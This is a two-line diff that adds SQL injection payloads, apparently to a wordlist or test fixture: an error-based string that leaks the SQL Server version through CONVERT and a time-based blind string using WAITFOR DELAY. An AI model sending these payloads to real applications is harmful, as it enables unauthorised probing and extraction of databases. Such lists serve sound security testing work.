@@ -1,0 +1,2 @@
+' AND 1=CONVERT(int,(SELECT @@version))--
+'; WAITFOR DELAY '0:0:5'--
